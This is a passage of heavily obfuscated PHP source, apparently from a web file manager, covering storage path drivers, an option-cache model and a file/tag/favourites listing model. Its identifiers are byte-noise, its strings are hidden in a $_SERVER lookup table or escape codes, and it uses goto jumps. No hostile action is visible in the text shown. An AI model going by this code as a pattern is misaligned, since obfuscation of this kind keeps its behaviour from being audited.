fread($è¥À§·Ç, $ôÕªÇìñ); fclose($è¥À§·Ç); return $ğ‡”Ù­; } public function upload($ÜÜ’—°Š, $’ˆ…ì·‡, $ä…ü”«¹ = false, $ôÏ€²™» = REPEAT_REPLACE) { if ($ä…ü”«¹) { return $this->moveFile($’ˆ…ì·‡, $ÜÜ’—°Š); } return $this->copyFile($’ˆ…ì·‡, $ÜÜ’—°Š); } public function setModifyTime($Îßôˆ°å, $ãâ®‘Ü³ = '') { @touch($Îßôˆ°å, intval($ãâ®‘Ü³)); } public function download($†ßµûØ, $Ê¯è°–©) { return $this->iconvSystem($†ßµûØ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($îŒŞëğ¯) { parent::__construct($îŒŞëğ¯); $this->signatureVersion($_SERVER[ßğøİ][216]); } public function fileOutLink($şˆñ÷œú) { $×è²Ò¾œ =& $_SERVER[ßğøİ]; if (substr($şˆñ÷œú, 0, 7) == $×è²Ò¾œ[1325]) { $şˆñ÷œú = $×è²Ò¾œ[1326] . substr($şˆñ÷œú, 7); } header($×è²Ò¾œ[161] . $şˆñ÷œú); die; } } goto F’ù¨†¨—ì; E¨ŠßğøÈÛ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($„¾ÛÅÆ• = false, $–éËş ê = '', $ÛğØÕÛ“ = false) { $ìèÍ¨Ä =& $_SERVER[ßğøİ]; $ÒæÍ‚‰õ = $this->cacheGet($–éËş ê); $ù»ú®ÇŒ = $this->optionDefault($–éËş ê); $ù»ú®ÇŒ = is_array($ù»ú®ÇŒ) ? $ù»ú®ÇŒ : array(); if (is_array($ÒæÍ‚‰õ)) { $ÒæÍ‚‰õ = array_merge($ù»ú®ÇŒ, $ÒæÍ‚‰õ); return $„¾ÛÅÆ• ? isset($ÒæÍ‚‰õ[$„¾ÛÅÆ•]) ? $ÒæÍ‚‰õ[$„¾ÛÅÆ•] : null : $ÒæÍ‚‰õ; } $§Ü¾Ô¥ = $this->filterWhere(array($ìèÍ¨Ä[33] => $–éËş ê)); $ÒæÍ‚‰õ = $this->where($§Ü¾Ô¥)->select(); $ÒæÍ‚‰õ = array_to_keyvalue($ÒæÍ‚‰õ, $ìèÍ¨Ä[94], $ìèÍ¨Ä[374]); foreach ($ÒæÍ‚‰õ as $ˆÛï´Æ‘ => $”Ë¬×Úï) { if ($ÛğØÕÛ“ || in_array($ˆÛï´Æ‘, $this->jsonField)) { $ÒæÍ‚‰õ[$ˆÛï´Æ‘] = json_decode($”Ë¬×Úï, !0); } } $this->cacheSet($–éËş ê, $ÒæÍ‚‰õ); $ÒæÍ‚‰õ = array_merge($ù»ú®ÇŒ, $ÒæÍ‚‰õ); return $„¾ÛÅÆ• ? $ÒæÍ‚‰õ[$„¾ÛÅÆ•] : $ÒæÍ‚‰õ; } public function set($ş¢•¹†¢, $ƒŒÔ¢ß¥ = false, $ĞÂî­Œ” = '') { $†ùğ¯ÀÌ =& $_SERVER[ßğøİ]; $this->cacheRemove($ĞÂî­Œ”); $ü£–±¢ğ = array(); $×‚ôû„É = is_array($ş¢•¹†¢) ? $ş¢•¹†¢ : array($ş¢•¹†¢ => $ƒŒÔ¢ß¥); foreach ($×‚ôû„É as $½˜ö¨ ¦ => $ãœ«¶¬¦) { if (is_array($ãœ«¶¬¦)) { $ãœ«¶¬¦ = json_encode_force($ãœ«¶¬¦); } $this->checkLength($ãœ«¶¬¦, !1, $this->tableName . $†ùğ¯ÀÌ[4] . $ş¢•¹†¢); $ãœ«¶¬¦ = self::textEncode($ãœ«¶¬¦); $×‚ôû„É = array($†ùğ¯ÀÌ[33] => $ĞÂî­Œ”, $†ùğ¯ÀÌ[94] => $½˜ö¨ ¦, $†ùğ¯ÀÌ[374] => $ãœ«¶¬¦); $ü£–±¢ğ[] = $this->filterWhere($×‚ôû„É); } if (!$ü£–±¢ğ) { return !0; } $Õ¸¯ùüÃ = $this->cacheKey($†ùğ¯ÀÌ[400]); CacheLock::lock($Õ¸¯ùüÃ); $‹™Ãö© = $this->addAll($ü£–±¢ğ, array(), !0); CacheLock::unlock($Õ¸¯ùüÃ); return $‹™Ãö©; } protected function optionDefault($Ñ¤°ğÖƒ = '') { return !1; } public function setDeep($Ì¸ª¿´¬, $š²Š±ûé = false, $ûËŒá§ = '') { $Öè¡Ÿ§Â = explode($_SERVER[ßğøİ][10], $Ì¸ª¿´¬); $ŞïŠºä = $this->get(); array_set_value($ŞïŠºä, $Ì¸ª¿´¬, $š²Š±ûé); $this->set($Öè¡Ÿ§Â[0], $ŞïŠºä[$Öè¡Ÿ§Â[0]], $ûËŒá§); } public function remove($¥¿¤÷¢, $¢ºà†›¦ = '') { $ç¬€¬†› =& $_SERVER[ßğøİ]; $this->cacheRemove($¢ºà†›¦); $üü€Â = $this->filterWhere(array($ç¬€¬†›[94] => $¥¿¤÷¢, $ç¬€¬†›[33] => $¢ºà†›¦)); if (is_null($¥¿¤÷¢)) { unset($üü€Â[$ç¬€¬†›[94]]); } return $this->where($üü€Â)->delete(); } public function cacheSet($’†€¥©, $Ş•Şõ•É = false) { return Cache::set($this->cacheKey($’†€¥©), $Ş•Şõ•É); } public function cacheGet($ª¬ı°ÂÀ) { return Cache::get($this->cacheKey($ª¬ı°ÂÀ)); } public function cacheRemove($‚ö‘Û‘) { return Cache::remove($this->cacheKey($‚ö‘Û‘)); } protected function filterWhere($É®ÇÌš) { return $É®ÇÌš; } protected function cacheKey($—¾ŸôÇ) { return $—¾ŸôÇ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\145"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\155\x65" => "\x69\157\x5f\163\157\165\162\x63\145\137\155\x65\164\x61", "\155\x65\164\141\106\x69\x65\154\x64" => "\163\x6f\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\x69\x6d\145", "\164\x69\155\x65", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\x74\151\157\x6e"), array("\143\162\145\x61\x74\x65\124\x69\x6d\x65", "\x74\151\155\x65", "\151\156\x73\x65\x72\164", "\146\x75\156\143\x74\151\157\156"), array("\166\151\x65\167\124\151\x6d\145", "\164\151\155\145", "\x69\x6e\163\145\162\x74", "\146\x75\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($†š®¶õù) { return $this->listSource(array($_SERVER[ßğøİ][401] => $†š®¶õù)); } public function typeName($ŞÕüö‰µ) { static $ÓÍ¹å€Ä = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\155", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $ÓÍ¹å€Ä[$ŞÕüö‰µ . $_SERVER[ßğøİ][12]]; } public function sourceListInfo($‹ÎÔòŸÉ, $ î¤ö¹ğ = false) { $ö’Êâ­Œ =& $_SERVER[ßğøİ]; $‹ÎÔòŸÉ = $‹ÎÔòŸÉ ? $‹ÎÔòŸÉ : array(); $‹ÎÔòŸÉ = array_filter(array_unique($‹ÎÔòŸÉ)); if (!$‹ÎÔòŸÉ) { return array(); } $Àˆ‹à± = $this->where(array($ö’Êâ­Œ[402] => array($ö’Êâ­Œ[7], $‹ÎÔòŸÉ)))->select(); $this->_listDataApply($Àˆ‹à±, $ î¤ö¹ğ); return array_to_keyvalue($Àˆ‹à±, $ö’Êâ­Œ[402]); } public function pathInfoFilter(&$¬…Úë¿Ã) { $Û±ı†¹Ë =& $_SERVER[ßğøİ]; static $î¦ÍŒé­ = false; static $ ¿óéü = false; static $¶‘ãÎ‹Š = false; if (!$î¦ÍŒé­) { $Ÿ‰·ºò = $Û±ı†¹Ë[403]; $Ÿ‰·ºò .= $Û±ı†¹Ë[404]; $Ÿ‰·ºò .= $Û±ı†¹Ë[405]; $ï‰­¿œ´ = $Û±ı†¹Ë[406]; $˜ÎÑÌŒÌ = explode($Û±ı†¹Ë[50], $ï‰­¿œ´); $î¦ÍŒé­ = explode($Û±ı†¹Ë[50], $Ÿ‰·ºò); $ ¿óéü = array(); foreach ($î¦ÍŒé­ as $‡õÉı¹) { if (in_array($‡õÉı¹, $˜ÎÑÌŒÌ)) { continue; } $ ¿óéü[] = $‡õÉı¹; } $¶‘ãÎ‹Š = explode($Û±ı†¹Ë[50], $Û±ı†¹Ë[407]); } foreach ($¶‘ãÎ‹Š as $ê²Üœø) { if (isset($¬…Úë¿Ã[$ê²Üœø])) { $¬…Úë¿Ã[$ê²Üœø] = intval($¬…Úë¿Ã[$ê²Üœø]); } } $¬…Úë¿Ã[$Û±ı†¹Ë[84]] = $Û±ı†¹Ë[408] . $¬…Úë¿Ã[$Û±ı†¹Ë[402]] . $Û±ı†¹Ë[409]; $¬…Úë¿Ã[$Û±ı†¹Ë[33]] = $¬…Úë¿Ã[$Û±ı†¹Ë[410]] == 1 ? $Û±ı†¹Ë[75] : $Û±ı†¹Ë[199]; $¬…Úë¿Ã[$Û±ı†¹Ë[411]] = $this->typeName($¬…Úë¿Ã[$Û±ı†¹Ë[411]]); if ($¬…Úë¿Ã[$Û±ı†¹Ë[410]] != 1) { $¬…Úë¿Ã[$Û±ı†¹Ë[174]] = $¬…Úë¿Ã[$Û±ı†¹Ë[412]]; unset($¬…Úë¿Ã[$Û±ı†¹Ë[412]]); } $ÄäõÔ•Î = $î¦ÍŒé­; if (isset($¬…Úë¿Ã[$Û±ı†¹Ë[413]]) && $¬…Úë¿Ã[$Û±ı†¹Ë[413]][$Û±ı†¹Ë[414]] == -1) { $ÄäõÔ•Î = $ ¿óéü; } $¬…Úë¿Ã = array_field_key($¬…Úë¿Ã, $ÄäõÔ•Î); return $¬…Úë¿Ã; } public function listUserFav() { $²×±”›® =& $_SERVER[ßğøİ]; $æ¾ğˆ‘¦ = Model($²×±”›®[415])->listData(); $ö¡ûÔ¼¹ = array_filter_by_field($æ¾ğˆ‘¦, $²×±”›®[33], $²×±”›®[416]); $ö¡ûÔ¼¹ = array_to_keyvalue($ö¡ûÔ¼¹, $²×±”›®[12], $²×±”›®[84]); if ($ö¡ûÔ¼¹) { $¼Îˆ¨… = $this->listSource(array($²×±”›®[417] => array($²×±”›®[418], $ö¡ûÔ¼¹))); } $¼Îˆ¨… = array_to_keyvalue($¼Îˆ¨…[$²×±”›®[369]], $²×±”›®[402]); foreach ($æ¾ğˆ‘¦ as &$€ëÄ›ÃÍ) { $€ëÄ›ÃÍ = array($²×±”›®[419] => $€ëÄ›ÃÍ[$²×±”›®[399]], $²×±”›®[420] => $€ëÄ›ÃÍ[$²×±”›®[32]], $²×±”›®[421] => $€ëÄ›ÃÍ[$²×±”›®[84]], $²×±”›®[422] => $€ëÄ›ÃÍ[$²×±”›®[33]], $²×±”›®[423] => $€ëÄ›ÃÍ[$²×±”›®[200]], $²×±”›®[424] => $€ëÄ›ÃÍ[$²×±”›®[85]]); if ($€ëÄ›ÃÍ[$²×±”›®[33]] == $²×±”›®[416] && $¼Îˆ¨…[$€ëÄ›ÃÍ[$²×±”›®[84]]]) { $€ëÄ›ÃÍ[$²×±”›®[86]] = $¼Îˆ¨…[$€ëÄ›ÃÍ[$²×±”›®[84]]]; } } unset($€ëÄ›ÃÍ); return $æ¾ğˆ‘¦; } public function listUserTag($ãÛÔÃ ğ) { $£¨ÌÄøº =& $_SERVER[ßğøİ]; if ($ãÛÔÃ ğ && !is_array($ãÛÔÃ ğ)) { $ãÛÔÃ ğ = array($ãÛÔÃ ğ); } $Üš§ÜÇ¨ = Model($£¨ÌÄøº[425])->listData(); $«¶ƒïË = array(); $•şÌ˜èÌ = array(); foreach ($Üš§ÜÇ¨ as $ÖŸ–İ‹ê) { $¥”î‰ìÁ = $ÖŸ–İ‹ê[$£¨ÌÄøº[84]]; if (!$¥”î‰ìÁ) { continue; } if (!isset($•şÌ˜èÌ[$¥”î‰ìÁ])) { $•şÌ˜èÌ[$¥”î‰ìÁ] = array(); } $•şÌ˜èÌ[$¥”î‰ìÁ][] = $ÖŸ–İ‹ê[$£¨ÌÄøº[426]]; $«¶ƒïË[$ÖŸ–İ‹ê[$£¨ÌÄøº[84]]] = $ÖŸ–İ‹ê; } $±‡Ìú¯ê = array(); $ı¿®ä¥Ÿ = array(); $€ÅÒ´İ× = array(); foreach ($•şÌ˜èÌ as $š å¼åÜ => $˜¢šËÒœ) { $ªûı×û© = !0; if (!$ãÛÔÃ ğ) { $±‡Ìú¯ê[] = $š å¼åÜ; continue; } foreach ($ãÛÔÃ ğ as $²¢ßùëñ) { if (!in_array($²¢ßùëñ, $˜¢šËÒœ)) { $ªûı×û© = !1; break; } } if (!$ªûı×û©) { continue; } if (!is_numeric($š å¼åÜ)) { $¡¯ĞôŠ§ = $«¶ƒïË[$š å¼åÜ]; $é®á­’ = array($£¨ÌÄøº[32] => $¡¯ĞôŠ§[$£¨ÌÄøº[32]], $£¨ÌÄøº[84] => $¡¯ĞôŠ§[$£¨ÌÄøº[84]], $£¨ÌÄøº[33] => $¡¯ĞôŠ§[$£¨ÌÄøº[33]], $£¨ÌÄøº[86] => array($£¨ÌÄøº[427] => 1), $£¨ÌÄøº[201] => !0); if ($¡¯ĞôŠ§[$£¨ÌÄøº[33]] == $£¨ÌÄøº[199]) { $€ÅÒ´İ×[] = $é®á­’; } if ($¡¯ĞôŠ§[$£¨ÌÄøº[33]] == $£¨ÌÄøº[75]) { $ı¿®ä¥Ÿ[] = $é®á­’; } continue; } $±‡Ìú¯ê[] = $š å¼åÜ; } if ($±‡Ìú¯ê) { $§™¹œ½¦ = $this->listSource(array($£¨ÌÄøº[417] => array($£¨ÌÄøº[418], $±‡Ìú¯ê))); } $§™¹œ½¦ = $§™¹œ½¦ ? $§™¹œ½¦ : array($£¨ÌÄøº[82] => array(), $£¨ÌÄøº[83] => array()); $§™¹œ½¦[$£¨ÌÄøº[82]] = array_merge($§™¹œ½¦[$£¨ÌÄøº[82]], $ı¿®ä¥Ÿ); $§™¹œ½¦[$£¨ÌÄøº[83]] = array_merge($§™¹œ½¦[$£¨ÌÄøº[83]], $€ÅÒ´İ×); if (isset($§™¹œ½¦[$£¨ÌÄøº[366]]) && count($±‡Ìú¯ê) == $§™¹œ½¦[$£¨ÌÄøº[366]][$£¨ÌÄøº[367]]) { return $§™¹œ½¦; } $ï•ƒÁ³ä = array(); $ã¾Æô³ƒ = array_to_keyvalue($§™¹œ½¦[$£¨ÌÄøº[82]], $£¨ÌÄøº[12], $£¨ÌÄøº[402]); $èé²ª¿¢ = array_to_keyvalue($§™¹œ½¦[$£¨ÌÄøº[83]], $£¨ÌÄøº[12], $£¨ÌÄøº[402]); $­ş¬„‡§ = array_merge($èé²ª¿¢, $ã¾Æô³ƒ); foreach ($±‡Ìú¯ê as $¥”î‰ìÁ) { if (!in_array($¥”î‰ìÁ, $­ş¬„‡§)) { $ï•ƒÁ³ä[] = $¥”î‰ìÁ; } } if ($ï•ƒÁ³ä) { Model($£¨ÌÄøº[428])->removeBySource($ï•ƒÁ³ä); } return $§™¹œ½¦; } public function listUserRecycle() { $ØÍÍö‹› =& $_SERVER[ßğøİ]; $ªÃšÀ· = Model($ØÍÍö‹›[429])->listData(); if (!$ªÃšÀ·) { return array(); } $šâ¸ÜÍá = array($ØÍÍö‹›[417] => array($ØÍÍö‹›[418], $ªÃšÀ·), $ØÍÍö‹›[430] => 1); return $this->listSource($šâ¸ÜÍá); } public function listSource($æ»á¾Ÿ, $ö”—ĞË = 3000, $—Õ”£æÂ = false) { $¾£óÙÆı =& $_SERVER[ßğøİ]; if (!isset($æ»á¾Ÿ[$¾£óÙÆı[431]])) { $æ»á¾Ÿ[$¾£óÙÆı[431]] = 0; } if (isset($æ»á¾Ÿ[$¾£óÙÆı[432]]) && $æ»á¾Ÿ[$¾£óÙÆı[432]] == $¾£óÙÆı[197]) { $æ»á¾Ÿ[$¾£óÙÆı[412]] = array($¾£óÙÆı[331], $¾£óÙÆı[433]); } $Á€‹Òñë = $¾£óÙÆı[434]; $˜åà´… = $this->field($Á€‹Òñë)->_makeOrder()->where($æ»á¾Ÿ)->selectPage($ö”—ĞË); $this->_listPageCheck($˜åà´…, $Á€‹Òñë, $æ»á¾Ÿ); $this->_listDataApply($˜åà´…[$¾£óÙÆı[369]], $—Õ”£æÂ); $this->_listMake($˜åà´…); return $˜åà´…; } private function _listPageCheck(&$Ö¶·ÀóÔ, $ì¢ªìØ¹, $ìó‰¶‹•) { $„ë­ü§ =& $_SERVER[ßğøİ]; if (!is_array($Ö¶·ÀóÔ[$„ë­ü§[366]])) { return; } $—ıòÀÅ = $Ö¶·ÀóÔ[$„ë­ü§[366]]; if ($—ıòÀÅ[$„ë­ü§[368]] <= 1) { return; } if ($—ıòÀÅ[$„ë­ü§[367]] >= 100000) { return; } if (Model($„ë­ü§[435])->get($„ë­ü§[436]) != $„ë­ü§[437]) { return; } $ì¢ªìØ¹ = str_replace(array($„ë­ü§[53], $„ë­ü§[342], $„ë­ü§[231]), $„ë­ü§[12], $ì¢ªìØ¹); $ì¢ªìØ¹ = $„ë­ü§[438] . str_replace($„ë­ü§[50], $„ë­ü§[439], $ì¢ªìØ¹) . $„ë­ü§[440]; $Ò³Ë•‚× = $„ë­ü§[441]; $Ò³Ë•‚× = $Ò³Ë•‚× . $„ë­ü§[442]; $ë¨§¯Æ = $—ıòÀÅ[$„ë­ü§[363]] * ($—ıòÀÅ[$„ë­ü§[353]] - 1) . $„ë­ü§[50] . $—ıòÀÅ[$„ë­ü§[363]]; $²¸¾¿¡û = $this->_makeOrder(!0); $ÛÈú»Ôô = $„ë­ü§[438] . str_replace($„ë­ü§[50], $„ë­ü§[439], $²¸¾¿¡û[0]); if (strpos($ÛÈú»Ôô, $„ë­ü§[443])) { $ÛÈú»Ôô = str_replace($„ë­ü§[443], $„ë­ü§[444], $ÛÈú»Ôô); } else { $ÛÈú»Ôô .= $„ë­ü§[445] . $²¸¾¿¡û[1]; } $ÀÇğø„Ş = array(); foreach ($ìó‰¶‹• as $Ô¶·ò«« => $ÕçÓğùñ) { $ÀÇğø„Ş[$„ë­ü§[438] . $Ô¶·ò««] = $ÕçÓğùñ; } $this->alias($„ë­ü§[446])->field($ì¢ªìØ¹)->limit($ë¨§¯Æ)->order($ÛÈú»Ôô); $æØ†´‹ = $this->join($Ò³Ë•‚×)->where($ÀÇğø„Ş)->select(); if ($æØ†´‹) { $Ö¶·ÀóÔ[$„ë­ü§[369]] = $æØ†´‹; } } protected function _makeOrder($Úñ¨Àçã = false) { $“©ÙÊè  =& $_SERVER[ßğøİ]; $¯€ÚÎô— = Model($“©ÙÊè [447])->get($“©ÙÊè [448]); $ì¼“Âï = Model($“©ÙÊè [447])->get($“©ÙÊè [449]); $˜¬äÚÙñ = array($“©ÙÊè [450] => $“©ÙÊè [451], $“©ÙÊè [452] => $“©ÙÊè [453]); $ªéæìœ¼ = array($“©ÙÊè [32] => $“©ÙÊè [32], $“©ÙÊè [76] => $“©ÙÊè [76], $“©ÙÊè [174] => $“©ÙÊè [412], $“©ÙÊè [454] => $“©ÙÊè [454], $“©ÙÊè [455] => $“©ÙÊè [456], $“©ÙÊè [200] => $“©ÙÊè [200], $“©ÙÊè [85] => $“©ÙÊè [85]); $«ºê–ó› = Input::get($“©ÙÊè [457], $“©ÙÊè [7], $¯€ÚÎô—, array_keys($ªéæìœ¼)); $Àæ¥ı¨ = Input::get($“©ÙÊè [458], $“©ÙÊè [7], $ì¼“Âï, array_keys($˜¬äÚÙñ)); if (!in_array($«ºê–ó›, array_keys($ªéæìœ¼))) { $«ºê–ó› = $“©ÙÊè [32]; } if (!in_array($Àæ¥ı¨, array_keys($˜¬äÚÙñ))) { $«ºê–ó› = $“©ÙÊè [450]; } if ($«ºê–ó› == $“©ÙÊè [32]) { } $÷¡–ˆ¥Ø = $“©ÙÊè [459] . $ªéæìœ¼[$«ºê–ó›] . $“©ÙÊè [53] . $˜¬äÚÙñ[$Àæ¥ı¨]; $÷¡–ˆ¥Ø = rtrim(trim($÷¡–ˆ¥Ø), $“©ÙÊè [50]); if ($Úñ¨Àçã) { return array($÷¡–ˆ¥Ø, $˜¬äÚÙñ[$Àæ¥ı¨]); } return $this->order($÷¡–ˆ¥Ø); } protected function _listDataApplyItem($Š¥Ş–ñ, $áœ®Ï‘ = false) { $Ï¬ÎÌûá = array($Š¥Ş–ñ); $this->_listDataApply($Ï¬ÎÌûá, $áœ®Ï‘); return $Ï¬ÎÌûá[0]; } protected function _listDataApply(&$Æ—ÆÀ˜‘, $ÇŸ£ìÛó = false) { $¿“©»Ø‰ =& $_SERVER[ßğøİ]; if (!$Æ—ÆÀ˜‘) { $Æ—ÆÀ˜‘ = array(); return; } $ë­²š¬½ = array_to_keyvalue($Æ—ÆÀ˜‘, $¿“©»Ø‰[12], $¿“©»Ø‰[402]); $ë­²š¬½ = array_unique($ë­²š¬½); $this->_listSourceCache($Æ—ÆÀ˜‘); if (!$ÇŸ£ìÛó) { $this->_listAppendMeta($Æ—ÆÀ˜‘, $ë­²š¬½); $this->_listAppendFileMeta($Æ—ÆÀ˜‘, $ë­²š¬½); $this->_listAppendChildren($Æ—ÆÀ˜‘, $ë­²š¬½); } $this->_listAppendPath($Æ—ÆÀ˜‘); $this->_listAppendAuth($Æ—ÆÀ˜‘); $this->_listAppendSourceInfo($Æ—ÆÀ˜‘, $ë­²š¬½); $this->_listAppendUser($Æ—ÆÀ˜‘); $this->_listFilterInfo($Æ—ÆÀ˜‘, $ÇŸ£ìÛó); $this->_listAppendAuthSecret($Æ—ÆÀ˜‘); } protected function _listSourceCache($Âğœ ¤¥) { $ú¶¼„‚É =& $_SERVER[ßğøİ]; foreach ($Âğœ ¤¥ as $äú‡äì) { self::$cacheSourceInfo[$ú¶¼„‚É[460] . $äú‡äì[$ú¶¼„‚É[402]]] = $äú‡äì; } } protected function _listFilterInfo(&$ùÛœ…ö”, $ïşÈÆ˜İ = false) { $˜´Ñ”Ş› =& $_SERVER[ßğøİ]; foreach ($ùÛœ…ö” as &$¥™Ñ£ÇÙ) { $¥™Ñ£ÇÙ = $this->pathInfoFilter($¥™Ñ£ÇÙ); self::$cachePathInfo[$˜´Ñ”Ş›[461] . intval($ïşÈÆ˜İ) . $˜´Ñ”Ş›[386] . $¥™Ñ£ÇÙ[$˜´Ñ”Ş›[402]]] = $¥™Ñ£ÇÙ; } unset($¥™Ñ£ÇÙ); } protected function _listMake(&$¨§Û•) { $ß…¶‰¨ =& $_SERVER[ßğøİ]; $¨§Û•[$ß…¶‰¨[82]] = array(); $¨§Û•[$ß…¶‰¨[83]] = array(); foreach ($¨§Û•[$ß…¶‰¨[369]] as $“óÒ¸§Ë) { $ÍƒŸ‰Ò° = $“óÒ¸§Ë[$ß…¶‰¨[410]] == 1 ? $ß…¶‰¨[82] : $ß…¶‰¨[83]; $¨§Û•[$ÍƒŸ‰Ò°][] = $“óÒ¸§Ë; } unset($¨§Û•[$ß…¶‰¨[369]]); } protected function _listAppendMeta(&$‘òŒÛÖ°, $ÆÅäØ°) { $¦ÙÎâñ’ =& $_SERVER[ßğøİ]; $¸‰§Å¾Ò = array($¦ÙÎâñ’[417] => array($¦ÙÎâñ’[418], $ÆÅäØ°)); $ú— ò¸ = Model($¦ÙÎâñ’[462])->field($¦ÙÎâñ’[463])->where($¸‰§Å¾Ò)->select(); if (!$ú— ò¸) { return; } $Ï…–û„ = array($¦ÙÎâñ’[464], $¦ÙÎâñ’[465], $¦ÙÎâñ’[444]); $¦Ãøœõµ = array(); foreach ($ú— ò¸ as $åø¬û¯á) { if (!isset($¦Ãøœõµ[$åø¬û¯á[$¦ÙÎâñ’[402]]])) { $¦Ãøœõµ[$åø¬û¯á[$¦ÙÎâñ’[402]]] = array(); } if (in_array($åø¬û¯á[$¦ÙÎâñ’[94]], $Ï…–û„)) { continue; } $¦Ãøœõµ[$åø¬û¯á[$¦ÙÎâñ’[402]]][$åø¬û¯á[$¦ÙÎâñ’[94]]] = $åø¬û¯á[$¦ÙÎâñ’[374]]; } foreach ($‘òŒÛÖ° as &$ÌÇÓ´‚) { $ÌÇÓ´‚[$¦ÙÎâñ’[466]] = !1; if (isset($¦Ãøœõµ[$ÌÇÓ´‚[$¦ÙÎâñ’[402]]])) { $ÌÇÓ´‚[$¦ÙÎâñ’[466]] = $¦Ãøœõµ[$ÌÇÓ´‚[$¦ÙÎâñ’[402]]]; } if ($this->fileIsLock($ÌÇÓ´‚) && $ÌÇÓ´‚[$¦ÙÎâñ’[413]]) { $ìô—µ– = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÌÇÓ´‚[$¦ÙÎâñ’[413]][$¦ÙÎâñ’[414]] = AuthModel::authDisable($ÌÇÓ´‚[$¦ÙÎâñ’[413]][$¦ÙÎâñ’[414]], $ìô—µ–); $ÌÇÓ´‚[$¦ÙÎâñ’[413]][$¦ÙÎâñ’[467]][$¦ÙÎâñ’[413]] = $ÌÇÓ´‚[$¦ÙÎâñ’[413]][$¦ÙÎâñ’[414]]; } } unset($ÌÇÓ´‚); } protected function _listAppendFileMeta(&$„Ÿ¬±ÙŞ, $ÉŠÙŞ–) { $¯ûµŞ—¬ =& $_SERVER[ßğøİ]; $»˜‡¡Ó§ = array_to_keyvalue($„Ÿ¬±ÙŞ, $¯ûµŞ—¬[12], $¯ûµŞ—¬[468]); $»˜‡¡Ó§ = array_filter(array_unique($»˜‡¡Ó§)); if (!$»˜‡¡Ó§) { return; } $“ŞÃÔ¿Ò = array($¯ûµŞ—¬[469] => array($¯ûµŞ—¬[418], $»˜‡¡Ó§)); $™Ãª¦†ì = $¯ûµŞ—¬[470]; $ìÙ¼›Ì = Model($¯ûµŞ—¬[471])->field($™Ãª¦†ì)->where($“ŞÃÔ¿Ò)->select(); $ìÙ¼›Ì = array_to_keyvalue($ìÙ¼›Ì, $¯ûµŞ—¬[468]); $­¼øéâï = Model($¯ûµŞ—¬[472])->field($¯ûµŞ—¬[473])->where($“ŞÃÔ¿Ò)->select(); $­¼øéâï = $­¼øéâï ? $­¼øéâï : array(); $£ÄÃæ³ = array(); foreach ($­¼øéâï as $œ…ëõ‘é) { if (!isset($£ÄÃæ³[$œ…ëõ‘é[$¯ûµŞ—¬[468]]])) { $£ÄÃæ³[$œ…ëõ‘é[$¯ûµŞ—¬[468]]] = array(); } $£ÄÃæ³[$œ…ëõ‘é[$¯ûµŞ—¬[468]]][$œ…ëõ‘é[$¯ûµŞ—¬[94]]] = $œ…ëõ‘é[$¯ûµŞ—¬[374]]; } foreach ($„Ÿ¬±ÙŞ as &$é³‡ÛŸé) { $êÆùüáş = $é³‡ÛŸé[$¯ûµŞ—¬[468]]; if (!$êÆùüáş || !is_array($ìÙ¼›Ì[$êÆùüáş])) { continue; } $ï‘ã­…û = $ìÙ¼›Ì[$êÆùüáş]; $ï‘ã­…û[$¯ûµŞ—¬[76]] = $é³‡ÛŸé[$¯ûµŞ—¬[76]]; $ï‘ã­…û[$¯ûµŞ—¬[32]] = $é³‡ÛŸé[$¯ûµŞ—¬[32]]; if (!isset(self::$cacheFileInfo[$¯ûµŞ—¬[474] . $êÆùüáş])) { self::$cacheFileInfo[$¯ûµŞ—¬[474] . $êÆùüáş] = array_merge(array(), $ï‘ã­…û); } unset($ìÙ¼›Ì[$êÆùüáş][$¯ûµŞ—¬[84]]); $ü•ÒÍ˜ = is_array($£ÄÃæ³[$êÆùüáş]) ? $£ÄÃæ³[$êÆùüáş] : array(); $é³‡ÛŸé[$¯ûµŞ—¬[170]] = array_merge($ü•ÒÍ˜, $ìÙ¼›Ì[$êÆùüáş]); if (isset($é³‡ÛŸé[$¯ûµŞ—¬[170]][$¯ûµŞ—¬[169]])) { $é³‡ÛŸé[$¯ûµŞ—¬[169]] = json_decode($é³‡ÛŸé[$¯ûµŞ—¬[170]][$¯ûµŞ—¬[169]], !0); unset($é³‡ÛŸé[$¯ûµŞ—¬[170]][$¯ûµŞ—¬[169]]); } } unset($é³‡ÛŸé); } protected function _listAppendSourceInfo(&$Ğ–®‡­ê, $şÁú‚Î‰) { $³İ°ğ™ì =& $_SERVER[ßğøİ]; if (!defined($³İ°ğ™ì[475])) { return; } $ÏƒíÉÈ = Model($³İ°ğ™ì[476])->listData(); $ÛøËøş³ = Model($³İ°ğ™ì[425])->listData(); $è¬ÎĞ×¡ = Model($³İ°ğ™ì[415])->listData(); $Ì°ı®Èô = Model($³İ°ğ™ì[477])->listSimple(); $‰Ø¸Ş³Ñ = array_to_keyvalue($ÏƒíÉÈ, $³İ°ğ™ì[399]); $ô©‹¬¨ş = array_to_keyvalue_group($ÛøËøş³, $³İ°ğ™ì[84], $³İ°ğ™ì[426]); $®ø…¥Ğ = array_to_keyvalue($è¬ÎĞ×¡, $³İ°ğ™ì[84]); $”ö“Úû = array_to_keyvalue_group($Ì°ı®Èô, $³İ°ğ™ì[402]); foreach ($Ğ–®‡­ê as &$Ì¸ÃçÊğ) { $Ì¸ÃçÊğ[$³İ°ğ™ì[86]] = array($³İ°ğ™ì[478] => 0, $³İ°ğ™ì[479] => 0, $³İ°ğ™ì[480] => 0); if (isset($®ø…¥Ğ[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]])) { $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[481]] = 1; $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[482]] = $®ø…¥Ğ[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]][$³İ°ğ™ì[32]]; } if ($ô©‹¬¨ş && 